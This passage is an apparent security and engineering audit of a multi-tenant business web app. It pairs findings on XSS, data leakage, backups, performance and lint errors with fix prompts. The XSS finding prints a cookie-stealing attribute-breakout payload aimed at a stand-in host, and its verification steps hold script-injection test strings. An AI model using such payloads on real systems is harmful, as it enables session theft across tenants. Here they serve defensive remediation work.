client-writable field on the org profile (src/services/orgStore.js line 34,
written by updateProfile at line 333), read by usePlanStatus.js line 19, and there
is no payment provider in the codebase at all.

INSPECT FIRST
- src/hooks/usePlanStatus.js (whole file) — plan resolution and usage counting.
- src/services/planConfig.js — PLANS, isLimitReached, getRemaining.
- src/services/orgStore.js lines 26-37 (PROFILE_FIELDS) and 333-344 (updateProfile).
- src/components/landing/pages/PricingPage.jsx — the advertised tiers.
- Every call site of canCreate / isAtLimit / refreshUsage across src/components.

IMPLEMENT
1. Choose a provider (Razorpay suits the INR/GST orientation of this product;
   Stripe if the target is global). Ask the user which they want before building.
2. Remove `plan`, `is_premium` and `ai_message_count` from PROFILE_FIELDS in
   orgStore.js so the client can never write them. Move billing state to a
   `subscriptions/{orgId}` document that firestore.rules makes READ-ONLY to org
   members and writable only by the server.
3. Build api/billing/: create-checkout-session.js, webhook.js, portal-session.js.
   The webhook MUST verify the provider's signature, must be idempotent (store
   processed event IDs), and is the ONLY thing that ever writes subscription
   state. Handle: subscription created, renewed, payment failed, cancelled,
   upgraded, downgraded.
4. Enforce limits server-side. Every quota-bearing creation path (offer letters,
   NDAs, MoUs, invoices, quotations, AI messages, bulk operations) must be checked
   by the server before the write is allowed — either in firestore.rules using the
   subscription doc, or by routing creation through a serverless function. The
   client check stays, but only as UX.
5. Replace the O(n) usage counting in usePlanStatus.js with maintained counters on
   `org_metadata/{orgId}.usage`, updated transactionally on each create/delete, so
   the count cannot drift and does not require reading every record.
6. Handle the full lifecycle: trial (if any), dunning on failed payment, grace
   period, downgrade behavior when a customer exceeds the lower tier's limits
   (do NOT delete their data — mark it read-only and prompt to upgrade), and
   cancellation with data export.
7. Wire PricingPage.jsx to real checkout, and add a Billing section in
   CompanyProfile with plan, usage, invoices and a "manage subscription" link.

EDGE CASES
- Webhook arrives before the client redirect completes — the subscription doc must
  be the source of truth, and the UI must poll or subscribe to it.
- Duplicate webhooks (providers retry) — idempotency keys are mandatory.
- A downgrade that puts an org over the new limit: block new creates, keep
  existing data readable.
- Currency, tax and GST invoice requirements for Indian customers.
- Refunds and chargebacks must revoke access.

MUST NOT BREAK
- Existing orgs must keep working; default them to the Free plan by creating
  subscription docs in a migration, and grandfather anyone currently marked
  premium.
- usePlanStatus's public API (canCreate, getRemainingCount, getUsagePercent,
  isAtLimit) should stay stable so component call sites don't all need rewriting.

VERIFY
- Prove that running `orgStore.updateProfile({plan:'max'})` in the console no
  longer grants Max features.
- Complete a real test-mode checkout end to end and confirm the plan changes.
- Simulate a failed renewal webhook and confirm access degrades correctly.
- Add tests for webhook idempotency and signature rejection.
```

---

## C-8 · DOM XSS via unescaped template interpolation in invoice rendering

**Severity:** CRITICAL · **Difficulty:** Low (1 day) · **Root cause:** String-built HTML

### Evidence

`src/components/financial/InvoiceList.jsx:144-160` builds an offscreen A4 sheet by string concatenation into `innerHTML`:

```js
const container = document.createElement('div');
container.style.cssText = 'position:absolute;left:-9999px;...';
container.innerHTML = `
  <div class="a4-sheet inv-preview" ...>
    <div class="doc-header">
      <div class="doc-header-left">
        ${company.logo_url ? `<img src="${company.logo_url}" alt="Logo" class="doc-header-logo" />` : ''}
        ${company.company_tagline ? `<div class="doc-header-tagline">${company.company_tagline}</div>` : ''}
      </div>
      <div class="doc-header-right">
        <div class="doc-header-name">${(company.company_name || doc.issued_by || '').toUpperCase()}</div>
        ${company.cin ? `<div class="doc-header-detail">CIN: ${company.cin}</div>` : ''}
        ${company.company_address ? `<div class="doc-header-detail">${company.company_address}</div>` : ''}
        ...
```

None of `company_tagline`, `company_name`, `cin`, `company_address`, `company_email`, `company_phone`, `company_website` or `logo_url` is escaped. All are free-text fields a user controls in `CompanyProfile.jsx`.

`logo_url` is interpolated **inside an attribute**, so `" onerror="fetch('//evil/'+document.cookie)` breaks out directly.

Combined with C-1 (any anonymous user can write any org's profile), an attacker can plant a payload in one tenant's profile and execute script in another user's authenticated session.

A second sink exists at `src/components/StampPreview.jsx:9`:

```js
<div className="stamp-svg" dangerouslySetInnerHTML={{ __html: svgString }} />
```

where `svgString = buildStampSvg(companyName, city, size)` interpolates user-supplied company name and city into SVG markup.

### Impact

Stored XSS in an authenticated financial application: session theft, fraudulent document generation, silent modification of bank details on invoices, and privilege escalation into the admin panel.

### AI implementation prompt

```
Eliminate the DOM XSS sinks in EdgeOS invoice and stamp rendering.

INSPECT FIRST
- src/components/financial/InvoiceList.jsx lines 135-230 (the full innerHTML
  template) — every `${...}` interpolation of `company.*` and `doc.*`.
- src/components/StampPreview.jsx (12 lines) and src/utils/imageUtils.js
  buildStampSvg — confirm whether companyName/city are escaped before entering SVG.
- src/components/CompanyProfile.jsx — the profile fields that feed these
  (company_name, company_tagline, cin, company_address, company_email,
  company_phone, company_website, logo_url, stamp_city).
- src/services/pdfService.js — check whether the same pattern appears there.

IMPLEMENT
1. Preferred fix for InvoiceList: stop building HTML from strings. The codebase
   already has a React component for this exact layout —
   src/components/InvoicePreview.jsx. Render it offscreen with
   ReactDOM.createRoot into the detached container instead of assigning innerHTML.
   React escapes text nodes by default, which removes the entire class of bug.
2. If a string-built path must remain for html2canvas/jsPDF reasons, then:
   - add a single `escapeHtml(s)` helper (& < > " ' /) and wrap EVERY text
     interpolation;
   - for logo_url, validate the URL with `new URL()` and allow only https: and
     data:image/ schemes, then attribute-encode it;
   - do not rely on the field being "internal" — with the current data model any
     tenant's profile is attacker-influenced.
3. For StampPreview, escape companyName and city inside buildStampSvg before they
   enter the SVG string, and strip any characters that could close a tag. Better:
   build the stamp with real React SVG elements and delete the
   dangerouslySetInnerHTML entirely.
4. Add a Content-Security-Policy header (see the infrastructure prompt I-1) as
   defense in depth: no unsafe-inline for scripts.

EDGE CASES
- Escaping must not corrupt legitimate content: company names with & or ', and
  addresses with line breaks, must still render correctly in both the on-screen
  preview and the generated PDF.
- html2canvas needs computed styles; if you switch to a React offscreen render,
  make sure the container is still in the document (offscreen via
  left:-9999px, not display:none) and that fonts/images have loaded before
  capture — keep the existing crossOrigin='anonymous' handling for logos.
- The generated PDF must be byte-for-byte visually identical to today's output.

MUST NOT BREAK
- Invoice, quotation and proforma PDF download from InvoiceList and FinanceStatus.
- The stamp rendering in CompanyProfile and on all generated documents.

VERIFY
- Set company_name to `<img src=x onerror=alert(1)>` and company_tagline to
  `"><script>alert(2)</script>`, then generate a PDF — no alert may fire and the
  text must appear literally in the document.
- Set logo_url to `x" onerror="alert(3)` — no alert.
- Visually diff a generated PDF before and after the change.
```

---

## C-9 · No backups, no data export, no migrations — with a live destructive delete path

**Severity:** CRITICAL · **Difficulty:** Medium (1 week) · **Root cause:** Operational maturity

### Evidence

- No backup configuration exists in the repository. No `firebase.json` means no scheduled Firestore export is defined as code.
- No migration framework or versioned migration scripts exist; the only script is `scripts/setup-admin.js`.
- No customer-facing data export anywhere in `src/`.
- The admin panel offers permanent, unrecoverable organization deletion (`admin/index.html:515`) guarded only by a `prompt()` — and reachable by anyone (C-2).
- The data model has an implicit "self-healing" migration that runs on every load (`orgStore.js:226-275`), copying RTDB into Firestore. This is undocumented, unversioned, and re-runs indefinitely.
- Data lives in three places simultaneously (Firestore, RTDB, `localStorage`) with no reconciliation record.

### Impact

A single accidental or malicious deletion is permanent and total. There is no recovery path, no point-in-time restore, and no way for a customer to retrieve their own data. This fails the most basic vendor due-diligence question any B2B buyer asks.

### AI implementation prompt

```
Establish backup, restore, export and migration capability for EdgeOS. There is
currently no backup config, no migration framework, no customer data export, and
an admin panel that permanently deletes organizations (admin/index.html:515).

INSPECT FIRST
- src/services/orgStore.js lines 176-318 — the load path, including the
  undocumented RTDB→Firestore "HYBRID HEAL" migration at lines 226-275.
- src/services/dualWriteService.js — the three-way write on onboarding.
- admin/index.html around line 515 — the destructive delete.
- The absence of firebase.json / .firebaserc at the repo root.

IMPLEMENT
1. Scheduled backups: add firebase.json and a scheduled Cloud Function (or Cloud
   Scheduler + gcloud firestore export) writing daily Firestore exports to a GCS
   bucket with 30-day retention and a monthly export retained 12 months. Do the
   same for RTDB. Enable Firestore Point-in-Time Recovery. Commit all of this as
   code, not console clicks.
2. Write and TEST a restore runbook at docs/RUNBOOK-restore.md: how to restore one
   organization, and how to restore everything, with the actual commands. An
   untested backup is not a backup — perform one real restore into a scratch
   project and record how long it took.
3. Soft delete everywhere: replace the admin hard delete with `deleted_at` +
   `deleted_by`, exclude soft-deleted records from all queries, and add a purge
   job that runs only after 30 days. (Coordinate with the C-2 admin prompt.)
4. Customer data export: add a "Export all data" action in CompanyProfile that
   calls an authenticated serverless function and returns a ZIP containing JSON for
   every collection belonging to the org plus the generated PDFs. This is both a
   trust feature and a GDPR/DPDP portability obligation.
5. Formalize migrations: create a migrations/ directory with numbered, idempotent,
   forward-only scripts and a `schema_version` field on org_metadata. Convert the
   implicit RTDB heal in orgStore.js:226-275 into an explicit, versioned, run-once
   migration, then DELETE the heal logic from the read path — it currently runs on
   every single load and silently rewrites data.
6. Add a documented Recovery Point Objective and Recovery Time Objective
   (suggest RPO 24h / RTO 4h to start) and state them in docs/.

EDGE CASES
- Exports must exclude server-only secrets (org_secrets, encrypted SMTP creds).
- Large orgs may exceed serverless memory/time limits — stream the ZIP or generate
  it to GCS and return a signed URL.
- The purge job must be idempotent and must never run against a non-soft-deleted
  org; add a dry-run mode and require an explicit flag.
- Restoring one org into a live database must not clobber newer data — restore to a
  staging collection first and diff.

MUST NOT BREAK
- Normal application reads must get faster, not slower, once the heal logic is
  removed from the hot path — verify orgStore.load() still returns correct data
  for existing orgs after the migration runs.

VERIFY
- Run the backup job, then perform a full restore into a scratch project and
  confirm data integrity.
- Soft-delete an org, confirm it disappears from the app, then restore it.
- Download a customer export and confirm it opens and contains everything.
```

---

# PART II — HIGH SEVERITY FINDINGS

---

## H-1 · 3.38 MB single-chunk bundle shipped to anonymous visitors

**Severity:** HIGH · **Difficulty:** Medium (4 days)

**Evidence** — production build output:

```
dist/assets/main-C2IMFzqc.js   3,382.59 kB │ gzip: 975.61 kB
dist/assets/main-mp8_LvCm.css    260.13 kB │ gzip:  42.18 kB
dist/assets/index.es-BIasrsiN.js 158.62 kB │ gzip:  52.96 kB

(!) Some chunks are larger than 500 kB after minification.
```

`src/App.jsx:15-58` statically imports **all 40+ route components** — including `TeamHierarchy` (`@xyflow/react`), `BillingRevenue` (`recharts`), bulk operations (`xlsx`), and `pdfService.js` (`jspdf`, 1,115 lines / 58 KB source). None is lazy-loaded.

Because `AppContent` renders `LandingPage` for logged-out users (`App.jsx:230`), **every anonymous marketing visitor downloads the entire authenticated application**, plus Firebase, plus the PDF engine, plus the spreadsheet parser, plus two charting libraries.

Only the landing sub-pages are code-split (they come through `subPageData`, visible as the small `*Page-*.js` chunks).

**Impact:** ~4–8 s time-to-interactive on 4G, a near-certain Lighthouse performance score below 40, and a direct hit on marketing conversion and Core Web Vitals ranking.

### AI implementation prompt

```
Code-split the EdgeOS bundle. Production build emits a single 3,382 kB
(976 kB gzip) main chunk plus a 260 kB CSS file, and every anonymous visitor to the
marketing landing page downloads the entire authenticated app.

INSPECT FIRST
- src/App.jsx lines 12-58 (all static route imports) and lines 516-553 (the Routes
  block) and line 230 (LandingPage rendered inside AppContent).
- vite.config.js lines 83-90 (rollupOptions with two entry points).
- package.json dependencies: @xyflow/react, recharts, xlsx, jspdf, framer-motion,
  firebase, react-signature-canvas, qrcode.react — identify which routes need each.

IMPLEMENT
1. Convert every route component in App.jsx to React.lazy() + a <Suspense> boundary
   with a real skeleton fallback (not a bare spinner). Prioritise the heaviest:
   TeamHierarchy (@xyflow/react), BillingRevenue + Dashboard (recharts), the four
   bulk components (xlsx), and everything importing pdfService.
2. Split the marketing shell from the app shell. LandingPage, Auth and Registration
   must be reachable WITHOUT loading Firestore-heavy app code. Restructure so that
   the logged-out branch (App.jsx:226-231) lazy-loads a marketing bundle and the
   authenticated branch lazy-loads the app bundle.
3. Make pdfService.js dynamically imported at its call sites
   (`const { generatePdf } = await import('../services/pdfService')`) so jsPDF and
   html2canvas leave the initial graph entirely. Same for xlsx in the bulk
   components and the CSV uploader.
4. Add manualChunks in vite.config.js to isolate stable vendor code:
   react/react-dom, firebase, and charts each in their own chunk so app deploys
   don't invalidate them.
5. Split the 260 kB / 13,302-line src/index.css. Extract per-feature CSS and import
   it from the component that owns it so it splits with the lazy route. At minimum,
   separate landing/marketing CSS from application CSS.
6. Add rollup-plugin-visualizer and commit a size budget: fail CI if the initial
   JS payload for the landing route exceeds 200 kB gzipped.
7. Set build.chunkSizeWarningLimit appropriately only AFTER the real fix — do not
   silence the warning as the fix.

EDGE CASES
- react-router + React.lazy needs Suspense above the Routes; make sure a lazy
  chunk failing to load (deploy mid-session, stale chunk) shows a "refresh to
  update" message rather than a white screen — add an error boundary that catches
  chunk-load errors specifically.
- The /portal route must stay lightweight; recipients are external users on
  unknown networks.
- Preserve the admin entry point in rollupOptions.

MUST NOT BREAK
- Every route must still render. Click through all 30+ routes after the change.
- Theme switching and the CopilotPanel (mounted at App.jsx:558, outside Routes)
  must be unaffected.

VERIFY
- `npm run build` and confirm no chunk exceeds 500 kB.
- Confirm the landing page's initial JS is under 200 kB gzipped.
- Run Lighthouse on the landing page before and after; report both scores.
```

---

## H-2 · Module-global singleton state in `orgStore` — cross-org data leakage

**Severity:** HIGH · **Difficulty:** High (1 week)

**Evidence** — `src/services/orgStore.js:9-12`:

```js
let _orgId = null;
let _cache = {};
let _loaded = false;
let _listeners = [];
```

All org data lives in module scope. Every consumer reads whatever org was last loaded. `storageService.getAll(orgId)` (`storageService.js:6-17`) **accepts an `orgId` parameter and completely ignores it**:

```js
getAll: async (orgId, type) => {
  if (!orgId) return [];
  try {
    const records = orgStore.getSectionAsList('records');   // ← reads the global
```

Meanwhile `OrgContext.fetchOrganizations` (`OrgContext.jsx:76-89`) loops over every org the user belongs to, calling `await orgStore.load(orgId)` for each — **each call overwrites the global cache**, then arbitrarily activates `nextOrgs[0]` (line 94). There is no `setActiveOrg` reload path, so switching orgs in the UI would show the wrong org's data.

The `listenSection` subscriptions (`orgStore.js:436-477`) push into a module-level `_listeners` array and mutate the same global `_cache`.

**Impact:** Multi-org users can see another org's records. The `_listeners` array leaks subscriptions across org switches. This also makes the store untestable (no way to instantiate two isolated stores) and blocks any future SSR.

### AI implementation prompt

```
Refactor src/services/orgStore.js from a module-global singleton into a properly
scoped, instantiable store, and fix the resulting cross-org data leaks.

INSPECT FIRST
- src/services/orgStore.js lines 9-12 (the module globals _orgId, _cache, _loaded,
  _listeners) and every function that touches them.
- src/services/storageService.js lines 6-17 — getAll(orgId) ignores its orgId
  argument and reads the global. Check EVERY method in this file for the same bug.
- src/services/documentStore.js — the same pattern, plus the _portalOrgId global at
  line 8.
- src/context/OrgContext.jsx lines 61-106 — fetchOrganizations loops calling
  orgStore.load(orgId), each overwriting the global, then picks nextOrgs[0].
- src/hooks/usePlanStatus.js — passes activeOrg.id into storageService.getAll.

IMPLEMENT
1. Convert orgStore into a factory: `createOrgStore(orgId)` returning an object
   that closes over its own orgId, cache, loaded flag and listener list. No module
   -level mutable state.
2. Provide the active store through React context (extend OrgContext) so components
   consume `useOrgStore()` rather than importing a singleton. Keying the provider
   on `activeOrg.id` makes org switching correct by construction — a new store is
   created and the old one's listeners are torn down.
3. Fix fetchOrganizations: it must NOT load every org's full dataset just to list
   them. Read org names from the memberships/organizations documents directly, and
   only instantiate a store for the ACTIVE org.
4. Implement real org switching: setActiveOrg must tear down the previous store's
   listeners, create the new store, and clear component state. Today there is no
   such path.
5. Fix storageService and documentStore to take the store as a dependency rather
   than importing the singleton, and make every method actually honour the org it
   is given. Delete the ignored-parameter pattern.
6. Ensure listener cleanup: every listenSection unsubscriber must be called when
   the store is disposed, and disposal must happen on logout and on org switch.

EDGE CASES
- The portal path (documentStore._portalOrgId) currently exists because the portal
  has no logged-in org context. After the C-4 changes the portal fetches through a
  server endpoint, so this global should be deleted entirely — coordinate the two.
- localStorage keys are already org-scoped (LS_KEY at orgStore.js:39), so per-org
  persistence continues to work; make sure disposal does not wipe them.
- The in-memory "pending writes" merge logic at orgStore.js:277-301 assumes a
  single global cache; re-derive it per store instance.

MUST NOT BREAK
- Single-org users (the overwhelming majority today) must see zero behavioural
  change.
- Offline-first behaviour: the app must still render instantly from localStorage
  before Firestore responds (orgStore.js:180-185).

VERIFY
- Create a user who belongs to two orgs. Confirm switching between them shows the
  correct records, employees, invoices and customers, with no bleed-through.
- Confirm logging out and logging in as a different user shows no residual data.
- Add unit tests instantiating two stores simultaneously and asserting isolation.
```

---

## H-3 · Confirmed crash: variable shadowing in `documentStore.save`

**Severity:** HIGH · **Difficulty:** Trivial (10 minutes)

**Evidence** — `src/services/documentStore.js:47-67`:

```js
save: async (doc) => {                              // ← parameter named `doc`
  ...
  } else if (_portalOrgId) {
    ...
    const fsDocRef = doc(firestore, 'fin_docs', doc.id);   // ← calls the PARAMETER
```

The Firestore `doc` function is imported at line 4, but the parameter `doc` shadows it inside this function. `doc(firestore, 'fin_docs', doc.id)` therefore attempts to invoke a plain object.

**Result:** `TypeError: doc is not a function`, thrown on the portal write path whenever `orgStore` is not loaded — which is exactly the recipient-portal scenario this branch exists to serve.

The same file uses the import correctly in `updateStatus` (line 85), confirming the shadowing is accidental.

### AI implementation prompt

```
Fix the shadowing crash in src/services/documentStore.js.

INSPECT
- src/services/documentStore.js line 4 (`import { doc, setDoc } from
  'firebase/firestore'`), line 47 (`save: async (doc) => {`), and line 63
  (`const fsDocRef = doc(firestore, 'fin_docs', doc.id);`).
- Compare with updateStatus at line 85 which uses the import correctly, proving
  the intent.

IMPLEMENT
- Rename the `save` parameter from `doc` to `docData` and update all references
  inside the function body (lines 48-69).
- Audit the whole file and src/services/ for any other shadowing of the firebase
  `doc`, `set`, `get`, `update`, `remove` imports.
- Add ESLint `no-shadow` and `no-shadow-restricted-names` to eslint.config.js and
  fix whatever else it surfaces.

MUST NOT BREAK
- The orgStore-loaded path (documentStore.js:54-55) is unaffected and must stay so.

VERIFY
- Write a unit test that calls documentStore.save() with orgStore unloaded and
  _portalOrgId set, and asserts no TypeError is thrown and both the RTDB and
  Firestore writes are attempted.
- Manually exercise a portal signature flow end to end.
```

---

## H-4 · No error boundaries — any render error blanks the entire application

**Severity:** HIGH · **Difficulty:** Low (1 day)

**Evidence:** grepping `src/` for `ErrorBoundary`, `componentDidCatch` and `Sentry` returns **nothing**. `src/main.jsx` is 321 bytes and wraps `<App/>` in nothing but a router.

React 19 unmounts the whole tree on an uncaught render error. With 86 ESLint errors including confirmed impure render calls and access-before-declaration bugs, unhandled errors are likely — and the user sees a white page with no recovery path and no report reaching the team.

### AI implementation prompt

```
Add error boundaries and error reporting to EdgeOS. There is currently no
ErrorBoundary, no componentDidCatch, and no error monitoring anywhere in src/.

INSPECT FIRST
- src/main.jsx (321 bytes — the mount point).
- src/App.jsx lines 610-629 (the provider stack) and 516-553 (the Routes block).
- src/components/portal/RecipientPortal.jsx — the externally-facing surface.

IMPLEMENT
1. Create src/components/shared/ErrorBoundary.jsx: a class component with
   getDerivedStateFromError + componentDidCatch, rendering a branded recovery UI
   with "Try again" (resets state) and "Back to Hub" actions. Accept a `fallback`
   prop so different levels can render differently.
2. Place boundaries at three levels:
   - Root, in main.jsx around <App/> — catches provider failures.
   - Route level, inside the <Routes> region in App.jsx — a crash in one feature
     must not blank the sidebar and navigation.
   - Around the CopilotPanel (App.jsx:558) and the portal, which are independent
     failure domains.
3. Add a chunk-load-error case: when a lazy import fails (stale deploy), show
   "A new version is available — reload" and reload on click. Coordinate with H-1.
4. Wire error reporting: add Sentry (@sentry/react) initialized in main.jsx behind
   an env var, with release tracking, source maps uploaded at build time, and
   `beforeSend` scrubbing PII — the payload must never carry gmail_app_password,
   bank_account_number, salaries, or full org profiles.
5. Replace the 96 raw console.* calls in src/ with a small logger utility that
   no-ops debug/info in production and routes warn/error to Sentry.

EDGE CASES
- Error boundaries do NOT catch errors in event handlers, async code, or effects
  cleanup — add explicit try/catch and Sentry.captureException in the async service
  layer (orgStore, documentStore, emailService, pdfService).
- The boundary itself must not crash if the error object is malformed.
- Do not report expected user-facing errors (validation failures, quota 429s) as
  exceptions.

MUST NOT BREAK
- Normal rendering; boundaries are transparent when nothing throws.

VERIFY
- Temporarily throw inside a route component and confirm the sidebar survives and
  the fallback renders.
- Throw in the root provider and confirm the root fallback renders.
- Confirm an event is delivered to Sentry in staging with a source-mapped stack.
```

---

## H-5 · 86 ESLint errors including real correctness bugs

**Severity:** HIGH · **Difficulty:** Medium (3 days)

**Evidence** — `npx eslint .` reports **86 errors, 13 warnings** across 46 files:

| Rule | Count | Nature |
|---|---|---|
| `no-unused-vars` | 57 | Dead code |
| `react-hooks/exhaustive-deps` | 13 | **Stale-closure bugs** |
| `react-hooks/set-state-in-effect` | 6 | Render loops |
| `react-hooks/purity` | 5 | **Non-deterministic render** |
| `no-undef` | 5 | Undefined globals |
| `no-sparse-arrays` | 4 | Likely typos |
| `react-refresh/only-export-components` | 4 | HMR breakage |
| `react-hooks/immutability` | 2 | **Access before declaration** |
| `no-empty` | 2 | Swallowed errors |

The impure-render errors are genuine defects. `QuotationForm.jsx:91,98` and `ProformaInvoiceForm.jsx:55,60` call `Date.now()` during render for item IDs and due dates, so **values change on every re-render** — line item identity is unstable, breaking React reconciliation and any keyed update. `PortalLinkGenerator.jsx:11` does the same with `Math.random()` (see C-4).

`react-hooks/immutability` flags real hoisting bugs in `InternRecords.jsx:39` and `FinanceStatus.jsx:78`, where an effect calls a `const` arrow function declared below it.

The 4 sparse-array errors (`MoUPreview.jsx:14`, `NdaPreview.jsx:14`, `pdfService.js:569,875`) are almost certainly double-comma typos silently inserting `undefined` into document content arrays.

### AI implementation prompt

```
Drive EdgeOS to zero ESLint errors, fixing real bugs rather than suppressing them.
Baseline: 86 errors, 13 warnings across 46 files.

INSPECT FIRST
Run `npx eslint . -f json` and work through by rule, hardest first.

IMPLEMENT — in this order
1. react-hooks/purity (5): QuotationForm.jsx:91,98 and ProformaInvoiceForm.jsx:55,60
   call Date.now() during render for line-item IDs and due dates;
   PortalLinkGenerator.jsx:11 calls Math.random(). Move all of these into
   useState initializers (lazy form: useState(() => ...)) or event handlers.
   Use crypto.randomUUID() for line-item IDs so they are stable and collision-free.
   Verify that adding/removing/reordering line items still behaves correctly.
2. react-hooks/immutability (2): InternRecords.jsx:39 and FinanceStatus.jsx:78 call
   loadRecords/loadDocuments from an effect declared above the function. Convert
   them to useCallback declared BEFORE the effect and add them to the dep array.
3. no-sparse-arrays (4): MoUPreview.jsx:14, NdaPreview.jsx:14, pdfService.js:569,875.
   These are double-comma typos injecting undefined into document content arrays —
   inspect what the array feeds and determine whether an element is MISSING (a
   dropped clause in a legal document would be a serious content bug) or the comma
   is spurious. Do not just delete the comma without checking the rendered output.
4. react-hooks/exhaustive-deps (13): each is a potential stale closure. Fix
   properly — wrap callbacks in useCallback, hoist stable values, or restructure.
   Do NOT add eslint-disable comments.
5. react-hooks/set-state-in-effect (6): restructure to derive state during render
   or use a key-reset pattern rather than setting state in an effect.
6. no-undef (5): vite.config.js (process, __dirname ×2), api/nvidia.js (process),
   scripts/setup-admin.js (process). Fix by adding proper env config to
   eslint.config.js — a `node` globals block for api/, scripts/ and *.config.js —
   rather than editing the source.
7. react-refresh/only-export-components (4) and no-empty (2): orgStore.js:480 and
   pdfService.js:151 swallow errors silently — log them through the new logger.
8. no-unused-vars (57): delete dead code. Do not rename to _unused.

THEN
- Add `npm run lint` to CI as a blocking check with --max-warnings 0.
- Add eslint-plugin-jsx-a11y and address what it finds (see U-2).

MUST NOT BREAK
- Any behaviour. After each rule group, run the app and click through the affected
  screens — especially the quotation, proforma and invoice forms where the
  purity fixes touch form state.

VERIFY
- `npx eslint .` exits 0.
- Manually create a quotation with multiple line items, reorder and delete them,
  and confirm correct behaviour.
- Diff a generated MoU and NDA PDF before/after the sparse-array fix to confirm no
  clause was lost or added.
```

---

## H-6 · SEO is effectively absent on a marketing-led product

**Severity:** HIGH · **Difficulty:** Medium (4 days)

**Evidence** — `index.html` (22 lines) contains a `<title>` and nothing else:

- ❌ No `<meta name="description">`
- ❌ No Open Graph tags (`og:title`, `og:description`, `og:image`, `og:url`)
- ❌ No Twitter Card tags
- ❌ No canonical URL
- ❌ No JSON-LD structured data (`SoftwareApplication` / `Organization`)
- ❌ No `robots.txt` — `public/` contains only images, `manifest.json` and `vite.svg`
- ❌ No `sitemap.xml`
- ❌ No per-route meta: all 12 landing sub-pages (`src/components/landing/pages/`) share one static title
- ❌ No SSR or prerendering — content renders client-side only

`index.html:10` also sets `maximum-scale=1.0, user-scalable=no`, which blocks pinch-zoom (WCAG 2.1 SC 1.4.4 failure, and a mobile-usability signal).

**Impact:** Zero organic acquisition. Shared links render without a preview card, materially reducing click-through. Twelve well-written content pages are invisible to search.

### AI implementation prompt

```
Make EdgeOS discoverable. index.html has only a <title>; there is no description,
no Open Graph, no canonical, no robots.txt, no sitemap, no structured data, and no
per-route metadata for the 12 landing sub-pages.

INSPECT FIRST
- index.html (22 lines) — note line 10's `maximum-scale=1.0, user-scalable=no`.
- src/components/landing/subPageData.js and src/components/landing/pages/*.jsx
  (12 pages: Pricing, Security, Support, Privacy, Terms, Changelog, Documentation,
  AICofounder, Invoicing, OfferLetters, Certificates, LegalDocuments, Quotations).
- src/App.jsx lines 617-622 — how sub-page routes are generated.
- public/ — currently only images, manifest.json, vite.svg.

IMPLEMENT
1. Base metadata in index.html: description, keywords, canonical, theme-color,
   full Open Graph set (og:type, og:title, og:description, og:image, og:url,
   og:site_name) and twitter:card=summary_large_image. Create a real 1200×630
   OG image and put it in public/.
2. REMOVE `maximum-scale=1.0, user-scalable=no` from the viewport meta — it is an
   accessibility failure and a mobile-usability negative signal. Verify the layout
   still holds when zoomed (see U-2).
3. Per-route metadata: add react-helmet-async (or React 19's native document
   metadata support) and give every landing sub-page and the main marketing page a
   unique title, description and canonical. Derive them from subPageData so they
   stay in one place.
4. Add public/robots.txt allowing marketing routes and disallowing /hub, /admin,
   /portal, /dashboard and all authenticated paths. Reference the sitemap.
5. Generate public/sitemap.xml at build time from the route list — add a small
   script to the build step so it never goes stale.
6. Add JSON-LD: SoftwareApplication (with offers reflecting the real pricing
   tiers), Organization, and BreadcrumbList on sub-pages.
7. Address the client-render problem. The landing pages are static content — the
   highest-value fix is prerendering them at build time (vite-plugin-ssg,
   vite-react-ssg, or a prerender step). Evaluate and implement; if full SSG is too
   invasive, at minimum prerender the 12 marketing sub-pages and the landing page
   to static HTML so crawlers and link unfurlers see real content.
8. Semantic HTML pass on the landing page: exactly one <h1>, correct heading
   order, <nav>/<main>/<footer> landmarks, descriptive alt text on all images
   (App.jsx uses alt="" on the logo in several places — that is correct for
   decorative use, but check the marketing images).

EDGE CASES
- Prerendering must not break the authenticated app or execute Firebase calls at
  build time — guard any browser-only code.
- The /portal route must be excluded from the sitemap and disallowed in robots.txt
  (it contains customer documents).
- Removing user-scalable=no may reveal layout bugs at high zoom; fix them rather
  than reverting.

MUST NOT BREAK
- The existing landing page visuals and parallax behaviour
  (useScrollParallax, useCardGlow).
- Client-side routing after hydration.

VERIFY
- Run Lighthouse SEO on the landing page and each sub-page — target 100.
- Validate structured data with Google's Rich Results Test.
- Confirm the OG card renders correctly by pasting a link into Slack/Twitter/
  LinkedIn preview tools.
- `curl` the prerendered landing page and confirm real content is in the HTML.
```

---

## H-7 · Three sources of truth with silent write failures

**Severity:** HIGH · **Difficulty:** High (1.5 weeks)

**Evidence:** Every write goes to three stores with **no coordination and no failure surfacing**. `orgStore.addItem` (`orgStore.js:365-387`):

```js
_cache[section][itemId] = clean;
persistToLS();                                    // 1. localStorage
if (itemRef) set(itemRef, clean).catch(() => {});  // 2. RTDB — errors DISCARDED
syncToFirestore(section, itemId, clean);           // 3. Firestore — errors logged only
```

`.catch(() => {})` appears on the RTDB write in `updateProfile` (342), `addItem` (384), `setItem` (397), `updateItem` (408), `removeItem` (419) and `setSection` (428). `syncToFirestore` catches and only `console.error`s (`orgStore.js:136-138`).

**A user can create an invoice, see a success message, and have it exist only in their browser's localStorage.** They will discover this on their next device.

The `dualWriteService` acknowledges the problem and chooses to hide it (`dualWriteService.js:154-157`):

```js
} catch (fsError) {
    console.error(`[CRITICAL ERROR] Failed to write Org ${orgId} to Firestore!`, fsError);
    // We do NOT throw here to preserve backwards compatibility and ensure users can use the app.
}
```

The "HYBRID HEAL" reconciliation (`orgStore.js:226-275`) then runs on **every load**, issuing up to 10 sequential RTDB reads and re-writing Firestore, with a heuristic at line 288 that keeps whichever store has *more items* — a rule that silently resurrects deleted records.

**Impact:** Silent data loss, undetectable divergence between stores, resurrection of deleted records, and a permanent doubling of storage cost and write latency.

### AI implementation prompt

```
Collapse the EdgeOS three-way write fan-out (localStorage + RTDB + Firestore) into
a single source of truth with observable failures.

INSPECT FIRST
- src/services/orgStore.js: syncToFirestore (112-139), load (176-318) including the
  HYBRID HEAL block (226-275) and the "more items wins" merge (277-301), and every
  write method — updateProfile (333), addItem (365), setItem (389), updateItem
  (401), removeItem (412), setSection (423). Note `.catch(() => {})` on every RTDB
  write.
- src/services/dualWriteService.js lines 143-157 — the deliberately swallowed
  Firestore failure.
- src/services/documentStore.js and storageService.js — thin wrappers over the same.

IMPLEMENT
1. Decide and commit to Firestore as the single source of truth. It already holds
   the richer schema, supports the security rules from C-1, and has offline
   persistence. Get the user's explicit agreement before proceeding, since this is
   a one-way door.
2. Write a versioned, idempotent migration (per C-9) that copies any RTDB-only data
   into Firestore, produces a reconciliation report (records only in RTDB, only in
   Firestore, differing), and requires review before cut-over.
3. Delete the RTDB write path from all six orgStore write methods and from
